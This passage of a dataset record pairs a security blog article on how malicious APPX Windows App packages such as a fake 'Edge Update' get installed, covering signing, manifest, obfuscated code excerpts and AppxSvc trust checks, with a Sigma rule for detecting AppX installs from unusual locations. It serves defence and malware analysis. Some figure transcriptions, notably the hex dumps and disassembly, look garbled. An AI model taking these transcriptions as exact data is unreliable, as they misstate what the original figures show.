DeploymentError,Microsoft.Windows.Appx.PackageManager.Commands.AddAppxPackageCommand\n```\n\n## Recommendations for Users and Administrators\n\nFor Windows to install a Windows App that is packaged, for example, into an *APPX* package, the system first has to establish trust in the package. To this end, Windows verifies the data integrity of the package based on the package signature and evaluates whether the package satisfies certain trust criteria. Some of the trust criteria that relate to the certificates in the package signature are the following:\n\n- If Windows App sideloading is not enabled on the system, the *APPX* package must originate from the Microsoft Store and be therefore counter-signed by Microsoft. App sideloading is not enabled by default on recent Windows versions. However, organizations may enable App sideloading on their managed devices or ask customers to turn App sideloading on in order to enable the deployment of Windows Apps built specifically for internal or customer use). These Windows Apps are known as LOB (line-of-business) Windows Apps.\n- If Windows App sideloading is enabled on the system, the *APPX* package must be signed such that:\n  - The system trusts the root certificate of the certificate chain in the signature – the certificate must be present in a certificate store for trusted root certificates.\n  - No certificate in the chain is revoked at package installation time.\n\nThe majority of the malicious *APPX* packages that the security community has observed as part of attacks have satisfied the criteria above.\n\nRecommendations for users and administrators for protecting against attacks that involve malware delivery via malicious Windows Apps include the following:\n\n- **For users:**\n  - Avoid downloading Windows Apps from the Microsoft Store without thoroughly examining relevant information, such as App vendor details, and number and quality of published user reviews. Be careful about typosquatting attempts – malicious Windows Apps with names that are very similar to legitimate, popular Windows Apps. Typosquatting is popular among malicious actors. Attackers have recently managed to plant malicious Windows Apps in the Microsoft Store. In addition, SentinelLabs has recently investigated typosquatting attacks against the crates.io Rust and the PyPI Python software repositories, referred to as CrateDepression and Pymafka.\n  - Stay vigilant against phishing attacks and avoid installing software and software updates from unknown sources. Malicious Windows Apps often come under the disguise of critical software updates.\n\n- **For administrators:** Malicious actors often use compromised legitimate code signing material, with end certificates that chain to trusted root certificates, to sign malicious Windows Apps. As this article shows, this enables the installation of the malicious App packages on victim systems. Therefore:\n  - Make sure that the systems under your management can timely and correctly verify whether a certificate has been revoked. This includes unrestricted access to CRL (Certificate Revocation List) and OCSP (Online Certificate Status Protocol) URLs, and/or up-to-date local CRL and OCSP caches. Certificate revocation is a crucial measure against the malicious Windows App threat.\n  - Make sure that the code signing material of your organization is kept secure. This is to prevent malicious actors from distributing malware masquerading as Windows Apps that originate from your organization.",
    "sigma_rule": {
      "title": "Uncommon AppX Package Locations",
      "id": "c977cb50-3dff-4a9f-b873-9290f56132f1",
      "status": "test",
      "description": "Detects an appx package added the pipeline of the \"to be processed\" packages which is located in uncommon locations",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "modified": "2024-12-25",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": 854
        },
        "filter_main_generic": {
          "Path|contains": [
            "C:\\Program Files\\WindowsApps\\",
            "C:\\Program Files (x86)\\",
            "C:\\Windows\\SystemApps\\",
            "C:\\Windows\\PrintDialog\\",
            "C:\\Windows\\ImmersiveControlPanel\\",
            "x-windowsupdate://",
            "file:///C:/Program%20Files"
          ]
        },
        "filter_main_specific": {
          "Path|contains": [
            "https://statics.teams.cdn.live.net/",
            "https://statics.teams.cdn.office.net/",
            "microsoft.com",
            "https://installer.teams.static.microsoft/"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_uncommon_package_locations.yml",
    "id": "712"
  },
  {
    "url": "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
    "markdown": "# Inside Malicious Windows Apps for Malware Deployment\n\n**Date:** July 14, 2022\n\nThis article discusses Windows Apps – Windows applications packaged into *APPX* or *MSIX* packages – as a medium to deploy malware. Though not as widely abused as other infection vectors, there have been a number of recent high profile attacks that use Windows Apps.\n\n- **November, 2021:** BazarBackdoor was distributed in the form of an *APPX* package.\n- **December, 2021:** Emotet malware was distributed by abusing a spoofing vulnerability in the Windows App Installer, software that installs Windows Apps.\n- **January, 2022:** Malicious Windows Apps in *APPX* format masquerading as critical browser updates were used to drop Magniber ransomware.\n- **February, 2022:** Windows Apps laced with the Electron Bot malware were uploaded to the Microsoft Store, a trusted library of Microsoft-certified packaged Windows Apps.\n\nSince Microsoft’s announcement that Office applications will by default disable the execution of Office macros in the context of documents that originate from untrusted sources, there has been an uptick in malicious actors using alternative mediums for deploying malware such as Windows Apps and Windows shortcut *LNK* files. Despite Microsoft recently rolling back the decision to disable by default Office macro execution, these media complement malicious macros and remain a threat to watch for.\n\nPrevious research on malicious Windows Apps focused on concrete system infections involving particular instances of such Apps. This article complements previous research by taking a generic perspective. I take an *APPX* package that malicious actors have used to deploy malware as a running example and provide:\n\n- A summarizing overview of the layout and content of *APPX* packages (*APPX* packages are structurally very similar to the alternative *MSIX* packages and the two Windows App packaging formats share the same deployment infrastructure).\n- An overview of selected activities that the Windows system conducts when a user installs a malicious *APPX* package.\n\nThis enables a better understanding of what occurs on a system when a user falls prey to an attack that involves a malicious Windows App – from the operating system activities at first user interaction with the file to the malware deployment that the file triggers.\n\nFor Windows to install an *APPX* package, whether malicious or not, the system first has to establish trust in the package. Microsoft provides the Microsoft Store to Windows users as a library of certified packaged Windows Apps. These packages are digitally counter-signed by Microsoft. Windows trusts by default *APPX* packages that originate from the Windows Store. However, when the Windows App sideloading feature is enabled, users can install *APPX* packages that do not originate from the Microsoft Store as well, that is, packages that are not counter-signed by Microsoft. Such are the majority of the malicious *APPX* packages that the security community has observed in attacks.\n\nIn this article, we will dig into how malicious *APPX* packages can be installed on a Windows 10 system, with a focus on how Windows establishes trust in an *APPX* package. I focus on this aspect since trust is a crucial part of the Windows App installation process. This process is what ultimately deploys malware on a system. I will use the malicious *APPX* package *edge_update.appx* (SHA1: *e491af786b5ee3c57920b79460da351ccf8f6f6b*) as a running example.\n\n## What Does a Malicious Windows App Look Like?\n\nThe `edge_update.appx` *APPX* package is signed with a code signing certificate issued to Foresee Consulting Inc. and a root certificate issued by DigiCert Trusted Root G4. Windows systems trust DigiCert root certificates and they are placed in the *Trusted Root Certification Authorities* certificate store.\n\nFigure 1 depicts the certificate chain of the digital signature of `edge_update.appx` before a Certificate Authority revoked the certificate.\n\n```image\nAlt: Figure 1: The certificate chain of the digital signature of *edge_update.appx* prior certificate revocation\nDescription: The image displays a certificate verification path for a digital signature. It shows the hierarchy of the certificate chain, starting from the root certificate 'DigiCert Trusted Root G4,' followed by a code signing certificate issued to 'Foresee Consulting Inc.' The path indicates that the digital signature is authenticated up to a trusted root authority, which is relevant for understanding the trustworthiness of the malicious Windows app discussed in the surrounding text.\nTranscription: |\n  Certificate\n  \n  General\n  Details\n  Certification Path\n  \n  Certification path\n  - DigiCert Trusted Root G4\n    - DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1\n      - Foresee Consulting Inc.\n```\n\n*APPX* packages are ZIP archive files that store the executable files that implement the packaged Windows App and additional files. Figure 2 depicts the content of `edge_update.appx`. The `eediwjus` directory stores the malicious Windows App that the executable files `eediwjus.exe` and `eediwjus.dll` implement. `eediwjus.exe` is a .NET Windows App (see Figure 3) that invokes the `mhjpfzvitta` function from `eediwjus.dll`. This function executes malicious code that is heavily control-flow obfuscated with unconditional jumps (see Figure 4). The analysis of the malicious code is out of the scope of this article.\n\n```image\nAlt: Figure 2: The content of *edge_update.appx*\nDescription: The image displays a directory listing of files within a malicious APPX package, specifically located in the path `C:\\Users\\<user>\\malicious_appx\\`. It shows the file names, their sizes, and timestamps of last modifications. The top section lists general files associated with the APPX package, including `AppxBlockMap.xml`, `AppxManifest.xml`, and `AppxSignature.p7x`, along with the malicious directory `eediwjus`. The bottom section provides a detailed view of the `eediwjus` directory, listing two executable files: `eediwjus.dll` and `eediwjus.exe`, along with their respective sizes.\nTranscription: |\n  Directory of C:\\Users\\<USER>\\malicious_appx\\\n  05/07/2022  12:47    <DIR>          .\n  05/07/2022  12:47    <DIR>          ..\n  29/12/2022  13:55    <DIR>          AppxBlockMap.xml\n  29/12/2022  13:55    <DIR>          AppxManifest.xml\n  29/12/2022  13:55    <DIR>          AppxMetadata\n  30/12/2022  12:47    <DIR>          AppxSignature.p7x\n                 2.439 AppxBlockMap.xml\n                 2.039 AppxManifest.xml\n                 8.342 AppxSignature.p7x\n                 2.216 resources.pri\n                 740  [Content_Types].xml\n                 [...]\n  \n  Directory of C:\\Users\\<USER>\\malicious_appx\\eediwjus\\\n  05/07/2022  12:47    <DIR>          .\n  05/07/2022  12:47    <DIR>          ..\n  29/12/2022  13:55         5.632 eediwjus.dll\n  29/12/2021  13:55         3.584 eediwjus.exe\n```\n\n```image\nAlt: Figure 3: The implementation of *eediwjus.exe*\nDescription: The image depicts a code snippet in C# that showcases a class named `eediwjus`. The code includes details such as the class definition, an import statement for a DLL named `eediwjus.dll`, and a method `mhjpfzvitta` that is declared as an external function. The `Main` method initializes a variable `lpBuffer` and calls the external function with this variable as an argument. The snippet is formatted with color coding to indicate different elements of the code, such as keywords and comments.\nTranscription: |\n  namespace eediwjus\n  {\n      // Token: 0x02000002 RID: 2\n      public class eediwjus\n      {\n          // Token: 0x06000001 RID: 1\n          [DllImport(\"eediwjus.dll\")]\n          private static extern void mhjpfzvitta(uint lpBuffer);\n  \n          // Token: 0x06000002 RID: 2 RVA: 0x00000250 File Offset: 0x00000250\n          private static void Main(string[] args)\n          {\n              uint lpBuffer = 5604U;\n              eediwjus.mhjpfzvitta(lpBuffer);\n          }\n      }\n  }\n```\n\n```image\nAlt: Figure 4: Control-flow obfuscated malicious code in *eediwjus.dll*\nDescription: The image displays a snippet of disassembled code, likely from the malicious executable `eediwjus.exe`. It shows various assembly language instructions, including push and jump operations, along with references to memory locations. The code is annotated with comments indicating cross-references to the function `mhjpfzvitta`, which is identified as part of the malicious behavior associated with this executable.\nTranscription: |\n  .text:0000000018000113F loc_18000113F:          ; CODE XREF: mhjpfzvitta+p\n  .text:0000000018000113F     push    rbp\n  .text:00000000180001140 loc_180001140:          ; CODE XREF: .text:00000000180001196\n  .text:00000000180001140     jmp     short loc_180001196\n  .text:00000000180001142 loc_180001142:         \n  .text:00000000180001142     push    r14\n  .text:00000000180001144 loc_180001144:          ; CODE XREF: .text:000000001800011F2\n  .text:00000000180001144     jmp     loc_1800011F2\n  .text:00000000180001146     db      83h, 99h, 21h\n  .text:00000000180001149 loc_18000114C:         \n  .text:0000000018000114C     lea     rdx, [rbp-8]\n  .text:0000000018000114C     jmp     loc_1800011E4\n  .text:00000000180001150     db      0F6h, 92h, 33h\n  .text:00000000180001153     db      7ch, 7dh\n  .text:00000000180001155 loc_18000115A:         \n  .text:0000000018000115A     mov     rbp, rsp\n  .text:0000000018000115D     jmp     short loc_1800011C9\n```\n\nIn addition to the files that implement a Windows App, an *APPX* package stores additional files, such as `AppxManifest.xml`, `AppxBlockMap.xml`, and `AppxSignature.p7x`.\n\n`AppxManifest.xml` is the package manifest, a file in XML (Extensible Markup Language) format that contains the information that Windows needs to deploy, display, and update a Windows App. This includes information about:\n\n- The publisher of the App, where the publisher is the entity that digitally signs the *APPX* package and that is responsible for the development and release of the Windows App.\n- Windows App properties, such as display name and logo.\n- Software dependencies and capabilities: The Windows system controls what system resources a Windows App can access with respect to the capabilities that the publisher has assigned to the App. System resources include the Internet, filesystem locations, and networking. In summary, Windows Apps execute in a sandboxed, access-restricted, environment for security reasons.\n\nFigure 5 depicts the content of `AppxManifest.xml` in the malicious `edge_update.appx`. The publisher of the Windows App is *Foresee Consulting Inc.*, the display name of the App is *Edge Update*, and the App has the capabilities `internetClient` and `runFullTrust`. The `internetClient` capability enables the malicious Windows App to download data from the Internet, probably a payload from an attacker-controlled endpoint.\n\n```image\nAlt: Figure 5: The content of *AppxManifest.xml* in *edge_update.appx* (trimmed for brevity)\nDescription: The image displays the content of the `AppxManifest.xml` file from the malicious `edge_update.appx` package. It includes XML code detailing the identity of the application, which is signed by Foresee Consulting Inc. The display name of the app is 'Edge Update', and it outlines several properties such as publisher information, version details, and resource requirements. Additionally, it highlights the app's capabilities, specifically 'internetClient' and 'runFullTrust', indicating that the application can access the internet and has full trust permissions within the Windows environment.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"utf-8\"?>\n  <Package xmlns=\"http://schemas.microsoft.com/appx/manifest/foundation/windows10\">\n    <Identity Name=\"3669e262-ec02-4e9d-bcbd-3d088b4afac9\" Publisher=\"CN=Foresee Consulting Inc., L=North York, S=Ontario, C=CA, SERIALNUMBER=1040913-1, OID.1.3.6.1.4.1.311.60.2.1.3=CA, OID.2.5.4.15=Private Organization\" Version=\"96.0.1072.0\" ProcessorArchitecture=\"neutral\" />\n    <Properties>\n      <DisplayName>Edge Update</DisplayName>\n      <PublisherDisplayName>Microsoft Inc</PublisherDisplayName>\n      <Logo>Images\\StoreLogo.png</Logo>\n    </Properties>\n    <Dependencies>\n      <TargetDeviceFamily Name=\"Windows.Universal\" MinVersion=\"10.0.14393.0\" MaxVersionTested=\"10.0.19041.0\" />\n      <TargetDeviceFamily Name=\"Windows.Desktop\" MinVersion=\"10.0.14393.0\" MaxVersionTested=\"10.0.19041.0\" />\n    </Dependencies>\n    <Resources>\n      <Resource Language=\"EN-US\" />\n    </Resources>\n    <Applications>\n      <Application Id=\"App\" Executable=\"eediwjus.exe\" EntryPoint=\"Windows.FullTrustApplication\">\n        <uap:SplashScreen Image=\"Images\\SplashScreen.png\" />\n        <uap:LockScreen BadgeLogo=\"Images\\BadgeLogo.png\" Notification=\"badgeAndTileText\" />\n      </Application>\n    </Applications>\n    <Capabilities>\n      <Capability Name=\"internetClient\" />\n      <rescap:Capability Name=\"runFullTrust\" />\n    </Capabilities>\n  </Package>\n```\n\n`AppxBlockMap.xml` is the package block map, a file in XML format that stores Base-64 encoded hash values of data blocks in the files that an *APPX* package archives. Windows uses these hashes to verify the data integrity of these files when installing an *APPX* package, a topic that I discuss further in this article.\n\nFigure 6 depicts the content of `AppxBlockMap.xml` in the malicious `edge_update.appx`. The `HashMethod` XML attribute specifies the hash algorithm for calculating the data block hash values in `AppxBlockMap.xml`. The `File` XML element specifies a file in the *APPX* package and the size of the file. The `Block` XML element specifies the hash value and the size of a single data block in the file. For example, a data block in `eediwjus.exe` that is 1304 bytes big has the SHA-256 hash value of *ad4f74c0c3ac37e6f1cf600a96ae203c38341d263dbac0741e602686794c4f5a* (in hexadecimal format).\n\n```image\nAlt: Figure 6: The content of *AppxBlockMap.xml* in *edge_update.appx* (trimmed for brevity)\nDescription: The image displays an XML structure representing the content of an *AppxBlockMap.xml* file from a malicious APPX package named `edge_update.appx`. It includes elements such as `HashMethod`, which specifies the hash algorithm used, and multiple `File` elements detailing individual files within the package. Each `File` entry lists attributes such as `File Name`, `Size`, and a corresponding `Block Hash`, which provides the SHA-256 hash of specific data blocks in the file.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n  <BlockMap xmlns=\"http://schemas.microsoft.com/appx/2010/blockmap\" HashMethod=\"http://www.w3.org/2001/04/xmlenc#sha256\">\n    <File Name=\"eediwjus\\eediwjus.exe\" Size=\"3584\" LfhSize=\"51\">\n      <Block Hash=\"ru90WOsNh+bz2AK2lq4gPDg8H5YusB0HmAmhnIM1Io=\" Size=\"1304\"/>\n    </File>\n    <File Name=\"eediwjus\\eediwjus.dll\" Size=\"5632\" LfhSize=\"51\">\n      <Block Hash=\"9C0gbarmyAq2IwgfMgfef+MUu1Up14eJ3YarNeRsY=\" Size=\"4280\"/>\n    </File>\n    <File Name=\"resources.pri\" Size=\"2216\" LfhSize=\"43\"/>\n    <File Name=\"AppxManifest.xml\" Size=\"2039\" LfhSize=\"46\">\n      <Block Hash=\"kMExXuwujmFwXpesPEI17NjZsArZfVULhB9=\" Size=\"902\"/>\n    </File>\n  </BlockMap>\n```\n\n`AppxSignature.p7x` is the *APPX* package signature, a PKCS (Public-Key Cryptography Standards) #7 digital signature data in ASN.1 (Abstract Syntax Notation One) format. `AppxSignature.p7x` stores signature data, such as the certificate chain of the digital signature and the actual signed data. The signed data includes hashes of files in the APPX package, such as `AppxManifest.xml` and `AppxBlockMap.xml`. Figure 7 depicts the formatted content of `AppxSignature.p7x` in the malicious `edge_update.appx`.\n\n```image\nAlt: Figure 7: The content of *AppxSignature.p7x* in *edge_update.appx* (trimmed for brevity)\nDescription: The image shows the structured content of a digital signature in ASN.1 format, specifically detailing the certificate chain related to the `edge_update.appx` APPX package. It includes sequences with object identifiers for various components such as the signature algorithm (SHA-256), the signing context for Microsoft code signing, and the common names of the involved entities: DigiCert Trusted Root G4 and Foresee Consulting Inc. This representation is crucial for understanding the security validations tied to the digital signature of malicious Windows applications.\nTranscription: |\n  SEQUENCE (2 elem)\n      OBJECT IDENTIFIER 1.2.840.113549.1.7.2 signedData (PKCS #7)\n      [0] (0 elem)\n  SEQUENCE (5 elem)\n      INTEGER 1\n      SET (1 elem)\n          SEQUENCE (2 elem)\n              OBJECT IDENTIFIER 2.16.840.1.101.3.4.2.1 sha-256 (NIST Algorithm)\n              NULL\n      SEQUENCE (2 elem)\n          OBJECT IDENTIFIER 1.3.6.1.4.1.311.2.1.4 spcIndirectDataContext (Microsoft code signing)\n          [0] (1 elem)\n              OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString DigiCert Trusted Root G4\n          [...]\n          OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1\n          [...]\n          OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString Foresee Consulting Inc.\n```\n\n## Is a Malicious Windows App Trustworthy?\n\nThe `AppxSvc` service (`Appx Deployment Service`), which the DLL (dynamic-link library) `%SystemRoot%\\System32\\appxdeploymentserver.dll` implements, orchestrates the installation of *APPX* packages. When a user installs an *APPX* package, the `AppxSvc` service verifies the data integrity of the package and verifies that the package satisfies certain trust criteria. Figure 8 depicts a simplified overview of the data integrity verification process that the `AppxSvc` service conducts.\n\n```image\nAlt: Figure 8: A simplified overview of the data integrity verification process that the *AppxSvc* service conducts\nDescription: The image is a flowchart depicting the data integrity verification process conducted by the `AppxSvc` service when installing an *APPX* package. It outlines the steps involved in verifying the package signature (`AppxSignature.p7x`), the verification of `AppxBlockMap.xml`, and the subsequent verification of data blocks specified by `AppxBlockMap.xml`. The flowchart indicates decision points where the process can either continue or terminate based on whether each verification step is successful.\nTranscription: |\n  AppxSvc verifies the package signature AppxSignature.p7x\n      ├── Verified?\n      │   ├── No\n      │   │   └── AppxSvc terminates the package installation\n      │   └── Yes\n      │       └── AppxSvc verifies AppxBlockMap.xml\n      │           ├── Verified?\n      │           │   ├── No\n      │           │   │   └── AppxSvc terminates the package installation\n      │           │   └── Yes\n      │           │       └── AppxSvc verifies the data blocks that AppxBlockMap.xml specifies\n      │           │           ├── Verified?\n      │           │           │   ├── No\n      │           │           │   │   └── AppxSvc terminates the package installation\n      │           │           │   └── Yes\n      │           │           │       └── AppxSvc continues the package installation\n```\n\nIn summary, the data integrity verification process consists of the following steps:\n\n1. The `AppxSvc` service invokes the *WinVerifyTrust* function to verify the *APPX* package signature `AppxSignature.p7x`, that is, to verify the signed data in `AppxSignature.p7x` using the certificate chain in `AppxSignature.p7x` (see Figure 7). The signed data includes hashes of files that the *APPX* package stores, including `AppxBlockMap.xml` (see Figure 6). For example, Figure 9 depicts the hash value of `AppxBlockMap.xml` in the malicious `edge_update.appx` and the same value in `AppxSignature.p7x`, the package signature of `edge_update.appx`.\n\n   ```image\n   Alt: Figure 9: The hash value of *AppxBlockMap.xml* in the package signature of *edge_update.appx*\n   Description: The image is a screenshot of a command-line interface displaying the SHA-256 hash value of a file named 'AppxBlockMap.xml'. The command executed is 'Get-FileHash', which computes the hash of the specified file. The output shows the algorithm used (SHA256) and the corresponding hash value: '025C22C3EAD2720DA646FEA322EEBEC95B5B1CD1D0991850FFD28C7890F157C9'. This screenshot is relevant to the context of validating data integrity for malicious Windows apps, specifically in relation to the data integrity verification process involving the AppxSvc service.\n   Transcription: |\n     PS C:\\Users\\<user>\\Desktop\\malicious_appx\\malicious_appx> Get-FileHash .\\AppxBlockMap.xml\n     Algorithm Hash\n     --------- ----\n     SHA256  025C22C3EAD2720DA646FEA322EEBEC95B5B1CD1D0991850FFD28C7890F157C9\n   ```\n\n2. The successful verification of the signed data in `AppxSignature.p7x` enables the `AppxSvc` service to verify the data integrity of the files whose hashes are part of the signed data, including `AppxBlockMap.xml`. The `AppxSvc` service does this by first computing the SHA-256 hash value of `AppxBlockMap.xml` and then comparing the computed value with the SHA-256 hash value of `AppxBlockMap.xml` in the previously verified signed data.\n\n3. Once the `AppxSvc` service verifies the data integrity of `AppxBlockMap.xml`, the service verifies the integrity of the data blocks that `AppxBlockMap.xml` specifies (see Figure 6). The service does this by first computing the hash values of the data blocks and then comparing the computed values with the Base-64 encoded hash values in `AppxBlockMap.xml`.\n\nThe steps above ensure that the data in an *APPX* package is credible, with the overall process relying on a successful verification of the signed data in `AppxSignature.p7x`. However, for Windows to install an *APPX* package, also a malicious package, the system also has to verify that the package satisfies a set of trust criteria.\n\nPrevious research provides more background information on the steps above. This article focuses on the trust criteria that relate to the certificates in `AppxSignature.p7x` that the `AppxSvc` service uses to verify the signed data in `AppxSignature.p7x`.\n\nThese certificates represent the root of trust for the data integrity verification of an *APPX* package and for establishing trust in the package. In addition, in contrast to other *APPX* package-internal data structures for data integrity and trust verification, the certificates are more relevant entities from an operational perspective to end-users.\n\nWhen the `AppxSvc` service installs the malicious `edge_update.appx`, the service executes:\n\n- The *CertVerifyCertificateChainPolicy* function to validate the certificates in `AppxSignature.p7x` against the following certificate validation policies: *CERT_CHAIN_POLICY_AUTHENTICODE* (2), *CERT_CHAIN_POLICY_AUTHENTICODE_TS* (3), *CERT_CHAIN_POLICY_BASE* (1), and *CERT_CHAIN_POLICY_BASIC_CONSTRAINTS* (5). Among other certificate properties, `CertVerifyCertificateChainPolicy` validates whether the certificates are valid for code signing and whether the root certificate is trusted – present in a certificate store for trusted root certificates, such as *Trusted Root Certification Authorities*.\n- The *CertGetCertificateChain* function to check the revocation status of the certificates in `AppxSignature.p7x`.\n\nIf any validation by `CertVerifyCertificateChainPolicy` or `CertGetCertificateChain` fails, the `AppxSvc` service does not establish trust in the *APPX* package and terminates the installation of `edge_update.appx`.\n\nTo demonstrate a failed validation by `CertVerifyCertificateChainPolicy`, Figure 10 depicts a scenario that I crafted: The `AppxSvc` service executes `CertVerifyCertificateChainPolicy` to validate the certificates in the package signature of `edge_update.appx` against the *CERT_CHAIN_POLICY_AUTHENTICODE* (2) and *CERT_CHAIN_POLICY_BASE* (1) certificate validation policies. The *CERT_CHAIN_POLICY_BASE* policy fails the validation of the certificates due to an untrusted root certificate – the root certificate issued by DigiCert Trusted Root G4 is not present in a certificate store for trusted root certificates. This causes the `AppxSvc` service to terminate the installation of `edge_update.appx`.\n\n```image\nAlt: Figure 10: *CertVerifyCertificateChainPolicy* fails the validation of the certificates in the package signature of *edge_update.appx* due to an untrusted root certificate\nDescription: The image depicts a debugger output showing a breakpoint hit in the `CertVerifyCertificateChainPolicy` function from the Windows `CRYPT32` library. It displays the memory address and instruction being executed, along with the value of the register `rcx` at two different points. The values of `rcx` indicate the status or result of the operation, which is often used in debugging to trace the execution flow and validate the correctness of cryptographic operations related to certificate verification.\nTranscription: |\n  Breakpoint 0 hit\n  CRYPT32!CertVerifyCertificateChainPolicy:\n  00007ffb`34485560 4c8bdc        mov     r11,rsp\n  00007ffb`34485563 488bce        mov     rcx,rdx\n  00007ffb`34485566 488bda        mov     rbx,rdx\n  00007ffb`34485569 488bcb        mov     rcx,r11\n  00007ffb`3448556c 488bce        mov     rcx,rdx\n  00007ffb`3448556f 488bda        mov     rbx,rdx\n  00007ffb`34485572 488bcb        mov     rcx,r11\n  00007ffb`34485575 488bce        mov     rcx,rdx\n  00007ffb`34485578 488bda        mov     rbx,rdx\n  00007ffb`3448557b 488bcb        mov     rcx,r11\n  00007ffb`3448557e 488bce        mov     rcx,rdx\n  00007ffb`34485581 488bda        mov     rbx,rdx\n  00007ffb`34485584 488bcb        mov     rcx,r11\n  rcx=00000000000000002\n  00007ffb`34485587 488bce        mov     rcx,rdx\n  00007ffb`3448558a 488bda        mov     rbx,rdx\n  00007ffb`3448558d 488bcb        mov     rcx,r11\n  00007ffb`34485590 488bce        mov     rcx,rdx\n  00007ffb`34485593 488bda        mov     rbx,rdx\n  00007ffb`34485596 488bcb        mov     rcx,r11\n  00007ffb`34485599 488bce        mov     rcx,rdx\n  00007ffb`3448559c 488bda        mov     rbx,rdx\n  00007ffb`3448559f 488bcb        mov     rcx,r11\n  rcx=00000000000000001\n```\n\nIn practice, `CertVerifyCertificateChainPolicy` successfully validates the certificates in the package signature of the malicious `edge_update.appx`. This is because the root certificate, which is issued by DigiCert Trusted Root G4, is present in the *Trusted Root Certification Authorities* certificate store.\n\n## Revoked, or Not, That is the Question\n\nThe `AppxSvc` service executes the `CertGetCertificateChain` function to check the revocation status of the certificates in the package signature of `edge_update.appx`, starting from the end certificate in the certificate chain – the one issued to Foresee Consulting Inc. (see Figure 11).\n\n```image\nAlt: Figure 11: The certificate issued to Foresee Consulting Inc. in the context of the *CertGetCertificateChain* function (in ASN.1 format)\nDescription: The image presents a hexadecimal and ASCII dump of a file, likely related to a certificate or digital signature. The dump includes addresses, hexadecimal values, and their corresponding ASCII representations. It appears to contain details about a certificate associated with Foresee Consulting Inc., as indicated by the text within the ASCII section. This information is relevant to the analysis of the certificate chain and its potential revocation status in the context of malicious Windows applications.\nTranscription: |\n  0:083: db 00000246' cdbe9ad8 L0x7e8\n  00000246' cdbe9ad0 30 82 07 e4 82 01 0a 82 00 00 00 00 00 00 00 00\n  00000246' cdbe9ae0 c0 f1 8d a3 e2 e3 00 01 02 01 0e 10 0b 00 00\n  00000246' cdbe9af0 0d ed 09 2a 86 48 86 f7 0d 01 01 01 0b 00 00\n  00000246' cdbe9b00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000246' cdbe9b10 15 03 65 04 53 00 01 01 01 0a 01 01 01 0b 00\n  00000246' cdbe9b20 30 49 30 47 06 09 2a 86 48 86 f7 0d 01 01 01\n  00000246' cdbe9b30 0c 01 01 01 0b 00 00 00 00 00 00 00 00 00\n  00000246' cdbe9b40 20 47 47 2a 64 64 64 64 64 64 64 64 64 64 64\n  00000246' cdbe9b50 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b60 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b70 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b80 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b90 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9ba0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bb0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bc0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bd0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9be0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bf0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9c00 0a 13 17 46 67 72 73 65 73 66 65 67 66 67 67\n  00000246' cdbe9c10 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c20 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c30 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c40 04 81 ad 38 81 aa 53 a0 51 a0 48 46 86 4d 68\n  00000246' cdbe9f20 74 0a 3a 2f 2e 2e 2e 2e 2e 2e 2e 2e 2e 2e 2e\n  00000246' cdbe9f30 72 74 2e 66 2f 64 64 64 64 64 64 64 64 64 64\n  00000246' cdbe9f40 72 72 67 67 67 67 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f50 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f60 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f70 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f80 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f90 48 41 73 67 67 67 67 67 67 67 67 67 67 67 67\n```\n\n`AppxSvc` executes `CertGetCertificateChain` such that the function verifies the revocation status of all certificates in the certificate chain, including the root certificate – the `dwFlags` parameter of `CertGetCertificateChain` has the value of **0x20000000** (*CERT_CHAIN_REVOCATION_CHECK_CHAIN*, see Figure 12).\n\n```image\nAlt: Figure 12: *CertGetCertificateChain* verifies the revocation status of all certificates in the certificate chain\nDescription: The image shows a debugger output for the `CertGetCertificateChain` function from the CRYPT32 library. It highlights a breakpoint where the function's execution has paused, displaying several memory addresses and values. Notably, the value '20000000' is emphasized, which corresponds to the `dwFlags` parameter used in the certificate chain verification process. This output is relevant as it provides technical details about the function's operation in the context of checking certificate revocation.\nTranscription: |\n  Breakpoint 3 hit\n  CRYPT32!CertGetCertificateChain:\n  